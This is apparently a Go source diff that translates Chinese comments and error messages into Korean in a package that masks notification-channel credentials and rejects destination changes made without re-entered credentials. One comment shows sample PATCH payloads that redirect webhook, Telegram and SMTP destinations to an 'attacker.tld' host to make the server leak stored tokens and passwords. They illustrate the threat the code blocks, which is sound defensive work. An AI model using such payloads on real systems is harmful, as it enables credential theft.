@@ -6,21 +6,21 @@ import (
 	"strings"
 )
 
-// MaskedPrefix 是掩码值的标记前缀。API 回显凭据时用带此前缀的值替换真实内容，
-// 更新接口收到带此前缀的值即理解为「保持库中原值不变」。
+// MaskedPrefix는 마스킹 값의 접두사입니다. API는 실제 자격 증명 대신 이 접두사가 있는
+// 값을 반환하고 갱신 API는 이를 기존 DB 값 유지로 해석합니다.
 //
-// 用前缀而不是空串或某个固定常量，是为了能顺带带上一点可辨识信息
-// （见 MaskedValue），让用户区分得出「这是哪个机器人」而不必重新粘贴密钥。
+// 빈 값이나 고정 상수 대신 접두사를 써서 약간의 식별 정보(MaskedValue 참조)를 포함하면
+// 사용자가 키를 다시 붙여 넣지 않아도 어느 봇인지 구분할 수 있습니다.
 const MaskedPrefix = "__masked__"
 
-// MaskedValue 生成一个掩码值：
+// MaskedValue는 다음 마스킹 값을 생성합니다.
 //
-//	"__masked__"              原值太短，不给任何提示
-//	"__masked__:…ab12cd"      带上原值末 6 位作为辨识提示
+//	"__masked__"              원본이 짧아 식별 정보 없음
+//	"__masked__:…ab12cd"      원본 마지막 6자리로 식별
 //
-// 只暴露末 6 位是刻意选择的：Webhook 地址的辨识信息在末段（如企业微信的 key、
-// 飞书的机器人 id），而前缀部分各机器人相同、没有辨识价值。末 6 位不足以
-// 还原凭据，但足以让配置者认出「是我那个群」。
+// Webhook 식별 정보(WeCom key, Feishu 봇 id)는 끝에 있고 앞부분은
+// 봇마다 같아 가치가 없으므로 마지막 6자리만 공개합니다.
+// 자격 증명을 복원하기에는 부족하지만 설정자가 채널을 알아보는 데는 충분합니다.
 func MaskedValue(secret string) string {
 	if len(secret) <= 6 {
 		return MaskedPrefix
@@ -28,14 +28,14 @@ func MaskedValue(secret string) string {
 	return MaskedPrefix + ":…" + secret[len(secret)-6:]
 }
 
-// IsMasked 报告某个值是否为掩码值（即接口回显后未被修改）。
+// IsMasked는 API 반환 후 수정하지 않은 마스킹 값인지 확인합니다.
 func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }
 
-// MaskConfig 返回配置的副本，把该渠道的凭据字段替换成掩码值。
+// MaskConfig는 설정 복사본의 자격 증명 필드를 마스킹합니다.
 //
-// 未知渠道类型返回空 map 而不是原配置——宁可让 UI 显示「配置不可用」，
-// 也不要在渠道类型无法识别时把可能含凭据的原始内容整个吐回去。
-// 非凭据字段原样保留，UI 才能正常展示。
+// 알 수 없는 유형은 자격 증명이 있을 수 있는 원본을 반환하지 않고 빈 map을 주어
+// UI에서 설정 사용 불가로 표시하도록 합니다.
+// 자격 증명이 아닌 필드는 UI 표시를 위해 그대로 유지합니다.
 func MaskConfig(kind string, cfg map[string]any) map[string]any {
 	channel, ok := Get(kind)
 	if !ok {
@@ -51,8 +51,8 @@ func MaskConfig(kind string, cfg map[string]any) map[string]any {
 			out[k] = v
 			continue
 		}
-		// headers 这类嵌套结构整体按一个凭据处理：逐个子键判断需要每个渠道
-		// 再声明一套「哪些子键是凭据」的规则，复杂度远超收益。
+		// headers 같은 중첩 구조는 전체를 자격 증명 하나로 취급합니다. 하위 키별 규칙을
+		// 채널마다 다시 정의하는 복잡성이 이점보다 크기 때문입니다.
 		if s, ok := v.(string); ok {
 			out[k] = MaskedValue(s)
 			continue
@@ -62,62 +62,62 @@ func MaskConfig(kind string, cfg map[string]any) map[string]any {
 	return out
 }
 
-// ErrDestinationChangedWithoutCredentials 表示「目标地址变了，但调用方没有对
-// 凭据字段表态」。返回它而不是默默放行或默默丢弃凭据，理由见 PrepareConfigUpdate。
+// ErrDestinationChangedWithoutCredentials는 대상 주소를 바꾸면서 자격 증명을 명시하지 않은 오류입니다.
+// 조용히 허용하거나 자격 증명을 버리지 않는 이유는 PrepareConfigUpdate를 참고하세요.
 type ErrDestinationChangedWithoutCredentials struct {
-	Changed []string // 发生变化的目的地键
-	Missing []string // 未显式表态的凭据键
+	Changed []string // 바뀐 목적지 키
+	Missing []string // 명시하지 않은 자격 증명 키
 }
 
 func (e *ErrDestinationChangedWithoutCredentials) Error() string {
-	return "目标地址（" + strings.Join(e.Changed, "、") + "）已变更，请同时重新填写凭据字段（" +
-		strings.Join(e.Missing, "、") + "）：填入新值，或显式留空表示不再需要凭据。" +
-		"原凭据只对旧地址有效，继续沿用等于把它交给新地址。"
+	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 변경되었습니다. 자격 증명 필드(" +
+		strings.Join(e.Missing, ", ") + ")도 새 값으로 다시 입력하거나 더 이상 필요 없으면 명시적으로 비우세요. " +
+		"기존 자격 증명은 이전 주소에만 유효하며 재사용하면 새 주소에 전달됩니다."
 }
 
-// PrepareConfigUpdate 合并渠道配置，并处理「目标地址变更」这一安全敏感情况。
+// PrepareConfigUpdate는 채널 설정을 병합하며 보안에 민감한 대상 주소 변경을 처리합니다.
 //
-// 它替代裸的 MergeConfig 用在渠道更新路径上，解决的是这样一条实测可行的路径：
-// 目标地址（消息发往哪）与凭据（用什么身份发）是两套独立字段，而 MergeConfig
-// 对「未提及的键」一律保留库中原值。于是任何能 PATCH 渠道的人只要**只改地址、
-// 对凭据避而不谈**，就能让服务器把库里的真凭据发到自己控制的端点：
+// 갱신 경로에서 단순 MergeConfig 대신 사용해 다음 경로를 막습니다.
+// 대상 주소와 자격 증명은 독립 필드이며 MergeConfig는 언급하지 않은 키를
+// 유지합니다. 채널 PATCH 권한자가 주소만 바꾸고 자격 증명을 생략하면
+// 서버가 DB의 실제 자격 증명을 공격자 엔드포인트로 보낼 수 있습니다.
 //
-//	webhook  {config:{url:"https://attacker.tld"}}  → 原始 Authorization 头随请求外发
-//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<真Token>/sendMessage
-//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 后交出用户名与密码
+//	webhook  {config:{url:"https://attacker.tld"}} → 기존 Authorization 헤더 외부 전송
+//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<실제Token>/sendMessage
+//	email    {config:{host:"smtp.attacker.tld"}} → STARTTLS 후 사용자명/비밀번호 전달
 //
-// 这条路径完全静默、不依赖重定向（所以拒绝跨主机跳转挡不住它），
-// 而且直接击穿了本包掩码机制的目标——「凭据不回显给浏览器」。
+// 리디렉션 없이 조용히 발생하므로 호스트 간 이동 차단으로 막을 수 없으며
+// 브라우저에 자격 증명을 노출하지 않는다는 마스킹 목적을 무너뜨립니다.
 //
-// 规则：只要某个目的地键被改成新值，调用方就必须对**每一个**凭据键显式表态：
-//   - 给出新值 → 用新值
-//   - 显式传空串 → 该字段不再需要凭据（保留清空语义）
-//   - 原样回传掩码值 / 干脆不提这个键 → 拒绝
+// 규칙: 목적지 키 하나라도 바뀌면 모든 자격 증명 키를 명시해야 합니다.
+//   - 새 값 → 새 값 사용
+//   - 명시적 빈 문자열 → 자격 증명 불필요, 지우기 유지
+//   - 마스킹 값 그대로 또는 키 생략 → 거부
 //
-// 第三种之所以也拒绝，是因为「掩码值」的含义正是「沿用旧凭据」，而旧凭据
-// 只对旧地址有效。这里刻意不做「自动丢弃凭据」——那对可选凭据字段
-// （webhook 的 headers、email 的 password）会静默变成「鉴权没了但接口返回 200」，
-// 比报错更难排查。宁可让操作者多填一次。
+// 마스킹은 기존 자격 증명 유지라는 뜻이고 기존 값은 이전 주소에만 유효하므로 거부합니다.
+// 자격 증명을 자동으로 버리지도 않습니다. 선택 필드(webhook headers, email password)를
+// 조용히 버리면 인증은 사라졌는데 API는 200을 반환해 더 조사하기 어렵습니다.
+// 따라서 운영자가 다시 입력하도록 합니다.
 func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
 	channel, ok := Get(kind)
 	if !ok {
-		return nil, fmt.Errorf("渠道类型 %q 未注册", kind)
+		return nil, fmt.Errorf("채널 유형 %q가 등록되지 않았습니다", kind)
 	}
 	secrets := channel.SecretKeys()
 	destinations := channel.DestinationKeys()
 
-	// 非字符串的凭据值（如 webhook 的 headers 是个对象）里若嵌着掩码字面量，
-	// 说明调用方把「保持原值」的哨兵塞进了结构体内部。MergeConfig 只认「字符串
-	// 且带前缀」为掩码，这种形态会被当普通对象原样存下去——库里真的落下字面量
-	// "__masked__"，后续鉴权静默失效且没有任何报错。宁可拒掉。
+	// 문자열이 아닌 자격 증명(headers 객체 등) 안에 마스킹 리터럴이 있으면
+	// 기존 값 유지 표식을 구조체 안에 넣은 것입니다. MergeConfig는 접두사 있는 문자열만
+	// 마스킹으로 인식하므로 이런 객체는 그대로 저장되어 DB에 실제로
+	// __masked__가 들어가고 오류 없이 인증이 실패합니다. 따라서 거부합니다.
 	//
-	// 这个检查必须放在**最前面**：地址没变时会走提前返回，放在后面就等于
-	// 只覆盖了「改地址」这一条路径（第一版就是这么放错的，测试直接抓到了）。
+	// 주소가 그대로면 조기 반환하므로 이 검사는 가장 먼저 해야 합니다.
+	// 뒤에 두면 주소 변경 경로만 검사하게 되며 초기 구현의 이 실수를 테스트가 찾아냈습니다.
 	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
 		return nil, err
 	}
 
-	// 找出真正被改掉的目的地键。掩码值等于「没改」。
+	// 실제 바뀐 목적지 키를 찾습니다. 마스킹 값은 변경 없음입니다.
 	var changed []string
 	for _, key := range destinations {
 		raw, present := incoming[key]
@@ -133,11 +133,11 @@ func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[stri
 		}
 	}
 	if len(changed) == 0 {
-		// 地址没变，走普通合并（掩码值保留原值、空串清空、其余覆盖）。
+		// 주소가 같으면 일반 병합: 마스킹은 유지, 빈 문자열은 삭제, 나머지는 덮어쓰기.
 		return MergeConfig(stored, incoming), nil
 	}
 
-	// 地址变了：要求对每个凭据键显式表态。
+	// 주소가 바뀌면 모든 자격 증명 키를 명시해야 합니다.
 	var missing []string
 	for _, key := range secrets {
 		raw, present := incoming[key]
@@ -155,11 +155,11 @@ func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[stri
 	return MergeConfig(stored, incoming), nil
 }
 
-// rejectMaskedInContainers 拒绝把掩码哨兵嵌在非字符串结构里提交。
+// rejectMaskedInContainers는 문자열 아닌 구조 내부의 마스킹 표식 제출을 거부합니다.
 //
-// 掩码机制的前提是「整个值就是个字符串」。像 webhook 的 headers 这种对象字段，
-// 只能整体掩码（写成字符串 "__masked__"）或整体提交；把哨兵塞进对象内部
-// 既表达不了「保持不变」，又会被当成真实值存进库。
+// 마스킹은 값 전체가 문자열일 때만 성립합니다. webhook headers 같은 객체는
+// 전체를 __masked__ 문자열로 마스킹하거나 전체 새 값을 제출해야 합니다.
+// 객체 내부 표식은 유지 의미를 표현하지 못하고 실제 값으로 저장됩니다.
 func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
 	for _, key := range secretKeys {
 		raw, present := incoming[key]
@@ -174,26 +174,26 @@ func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) erro
 			continue
 		}
 		if strings.Contains(string(encoded), MaskedPrefix) {
-			return fmt.Errorf("字段 %s 的内容里含掩码标记 %q：该字段只能整体留空表示沿用、或整体提交新值，不能在结构体内部夹带掩码占位",
+			return fmt.Errorf("필드 %s 내부에 마스킹 표식 %q가 있습니다. 필드 전체를 생략해 기존 값을 유지하거나 전체 새 값을 제출하세요. 구조 내부에 마스킹 값을 넣을 수 없습니다",
 				key, MaskedPrefix)
 		}
 	}
 	return nil
 }
 
-// sameConfigValue 比较两个配置值是否等价。用 JSON 序列化比较是为了顺带处理
-// 类型差异——前端提交的端口是 number，而库里读回来的是 float64，直接 == 会误判。
+// sameConfigValue는 JSON 직렬화로 설정 동등성을 비교해 프런트엔드 number와 DB float64처럼
+// 직접 == 비교 시 틀릴 수 있는 유형 차이를 처리합니다.
 //
-// 「空」必须先归一化再比较：空串与「键不存在」在这个配置模型里是同一个状态，
-// 因为 MergeConfig 把空串当显式清空、直接 delete 掉该键。不归一化的话，一个
-// 始终留空的可选目的地字段（Telegram 的 base_url 是唯一这样的字段：留空即用
-// 官方地址）会走成这条路径——
+// 빈 문자열과 키 없음은 같은 상태로 정규화해야 합니다. MergeConfig가 빈 문자열을
+// 명시적 지우기로 해석해 키를 삭제하기 때문입니다. 정규화하지 않으면
+// Telegram base_url처럼 선택 목적지 필드(비면 공식 주소 사용)가
+// 다음 순서로 잘못 처리됩니다.
 //
-//	新建时存下 base_url:""  →  第一次保存被 MergeConfig 删键
-//	→ 第二次保存时 incoming 是 ""、stored 缺键，被判成「地址变了」
-//	→ 凭据是掩码值 → 400「目标地址已变更，请同时重新填写凭据字段」
+//	생성 시 base_url:"" 저장 → 첫 저장에서 MergeConfig가 키 삭제
+//	→ 두 번째 저장은 입력 ""와 저장된 키 없음이 다르다고 판단
+//	→ 자격 증명이 마스킹되어 대상 변경/자격 증명 재입력 400 오류
 //
-// 此后每次保存都失败，除非用户重新粘贴一遍 Bot Token，而他什么都没改。
+// 사용자는 아무것도 바꾸지 않았는데 매번 Bot Token을 다시 붙여 넣어야 합니다.
 func sameConfigValue(a, b any) bool {
 	if isBlankConfigValue(a) && isBlankConfigValue(b) {
 		return true
@@ -206,9 +206,9 @@ func sameConfigValue(a, b any) bool {
 	return string(ra) == string(rb)
 }
 
-// isBlankConfigValue 判定一个配置值是否为「空」。
-// 口径必须与 MergeConfig 的清空判定一致（strings.TrimSpace(s) == ""），
-// 否则会出现「MergeConfig 认为该删、sameConfigValue 认为有值」的夹缝。
+// isBlankConfigValue는 설정 값이 빈 값인지 판단합니다.
+// MergeConfig의 지우기 기준(strings.TrimSpace(s) == "")과 같아야
+// 한쪽은 삭제, 다른 쪽은 값 있음으로 보는 불일치가 없습니다.
 func isBlankConfigValue(v any) bool {
 	if v == nil {
 		return true
@@ -217,18 +217,18 @@ func isBlankConfigValue(v any) bool {
 	return ok && strings.TrimSpace(s) == ""
 }
 
-// MergeConfig 把 incoming 合并到 stored 之上，用于更新渠道配置。
+// MergeConfig는 채널 갱신을 위해 incoming을 stored에 병합합니다.
 //
-// 规则：
-//   - incoming 里值为掩码的键 → 保留 stored 的原值（用户没改这个字段）
-//   - incoming 里值为空串的键 → 视为显式清空，删除该键
-//   - 其余键 → 用 incoming 的值覆盖
-//   - stored 里有而 incoming 里没有的键 → 保留（局部更新语义）
+// 규칙:
+//   - incoming 마스킹 값 → stored 유지(미수정)
+//   - incoming 빈 문자열 → 명시적 지우기로 키 삭제
+//   - 나머지 → incoming으로 덮어쓰기
+//   - stored에만 있는 키 → 유지(부분 갱신)
 //
-// 空串是否算「清空」需要明确：前端表单把未填的字段提交为空串，
-// 若把它当成有效值写入，会把「留空以保留原值」的字段真的清掉。
-// 这里选择显式清空，因为要清除一个设错的字段时，用户没有别的表达方式
-// （拖走字段可区分「未提供」与「提供空值」，但 UI 用不到这个区别）。
+// 빈 문자열의 의미를 명확히 해야 합니다. 프런트엔드는 미입력 필드도 빈 값으로 보내므로
+// 기존 값 유지와 지우기를 혼동할 수 있습니다.
+// 여기서는 잘못 설정한 필드를 지울 방법을 제공하기 위해 명시적 지우기로 해석합니다.
+// 키 생략으로 미제공과 빈 값 제공을 구분할 수 있지만 UI는 그 차이를 사용하지 않습니다.
 func MergeConfig(stored, incoming map[string]any) map[string]any {
 	out := make(map[string]any, len(stored)+len(incoming))
 	for k, v := range stored {
@@ -237,7 +237,7 @@ func MergeConfig(stored, incoming map[string]any) map[string]any {
 	for k, v := range incoming {
 		if s, ok := v.(string); ok {
 			if IsMasked(s) {
-				continue // 掩码值 = 未修改，保留 stored
+				continue // 마스킹 값 = 미수정, stored 유지
 			}
 			if strings.TrimSpace(s) == "" {
 				delete(out, k)
